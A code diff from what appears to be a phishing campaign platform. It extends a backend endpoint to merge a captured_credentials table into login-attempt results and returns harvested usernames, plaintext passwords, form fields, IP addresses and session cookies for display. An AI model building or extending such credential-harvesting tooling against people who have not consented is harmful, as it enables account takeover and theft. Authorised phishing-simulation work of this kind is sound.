@@ -806,6 +806,20 @@ const getLoginAttempts = async (req, res) => {
     });
 
     console.log(`Found ${loginAttempts.length} login attempts for campaign ${id}`);
+
+    // Also get any credentials from captured_credentials table that might not be in login_attempts
+    const capturedCredentials = await new Promise((resolve, reject) => {
+      db.all(
+        `SELECT * FROM captured_credentials WHERE campaign_id = ? ORDER BY created_at DESC`,
+        [id],
+        (err, rows) => {
+          if (err) reject(err);
+          else resolve(rows || []);
+        }
+      );
+    });
+
+    console.log(`Found ${capturedCredentials.length} additional captured credentials for campaign ${id}`);
     
     // Format the login attempts for response
     const formattedAttempts = loginAttempts.map(attempt => {
@@ -821,13 +835,44 @@ const getLoginAttempts = async (req, res) => {
 
       // Parse form data if present
       let formData = {};
+      let formFields = [];
       if (attempt.form_data) {
         try {
           formData = JSON.parse(attempt.form_data);
+          
+          // Extract form fields for display
+          if (formData && typeof formData === 'object') {
+            // Check if formData itself is the form fields
+            if (formData.formData && typeof formData.formData === 'string') {
+              try {
+                const parsedFormData = JSON.parse(formData.formData);
+                formFields = Object.entries(parsedFormData).map(([key, value]) => ({
+                  name: key,
+                  value: value
+                }));
+              } catch (e) {
+                console.error('Error parsing nested formData:', e);
+              }
+            } else {
+              // Direct form fields in the object
+              formFields = Object.entries(formData).map(([key, value]) => ({
+                name: key,
+                value: value
+              }));
+            }
+          }
         } catch (e) {
           console.error('Error parsing form data:', e);
         }
       }
+
+      // Format cookies for better display
+      const formattedCookies = cookies.map(cookie => ({
+        name: cookie.name,
+        value: cookie.value,
+        domain: cookie.domain || (attempt.url ? new URL(attempt.url).hostname : 'unknown'),
+        timestamp: cookie.timestamp
+      }));
 
       return {
         id: attempt.id,
@@ -841,13 +886,57 @@ const getLoginAttempts = async (req, res) => {
         userAgent: attempt.user_agent,
         hasCookies: attempt.has_cookies === 1,
         cookiesCount: cookies.length,
-        formData: formData
+        cookies: formattedCookies,
+        formData: formData,
+        formFields: formFields
       };
     });
 
+    // Format any additional captured credentials
+    const additionalCredentials = capturedCredentials.map(cred => {
+      let formFields = [];
+      let otherFields = {};
+      
+      if (cred.other_fields) {
+        try {
+          otherFields = JSON.parse(cred.other_fields);
+          
+          if (otherFields && typeof otherFields === 'object') {
+            formFields = Object.entries(otherFields).map(([key, value]) => ({
+              name: key,
+              value: value
+            }));
+          }
+        } catch (e) {
+          console.error('Error parsing other_fields:', e);
+        }
+      }
+
+      return {
+        id: `cred-${cred.id}`, // Add prefix to distinguish from login attempts
+        targetEmail: "Unknown", // Usually not linked to specific email
+        timestamp: cred.created_at,
+        username: cred.username,
+        password: cred.password,
+        inputEmail: null,
+        url: cred.url,
+        ipAddress: cred.ip_address,
+        userAgent: cred.user_agent,
+        hasCookies: false,
+        cookiesCount: 0,
+        cookies: [],
+        formData: otherFields,
+        formFields: formFields,
+        captureMethod: cred.capture_method || 'form_submission'
+      };
+    });
+
+    // Combine both sources, with login attempts first
+    const allCredentials = [...formattedAttempts, ...additionalCredentials];
+
     return res.json({
       campaign: campaign,
-      loginAttempts: formattedAttempts
+      loginAttempts: allCredentials
     });
   } catch (err) {
     console.error('Error getting login attempts:', err.message);
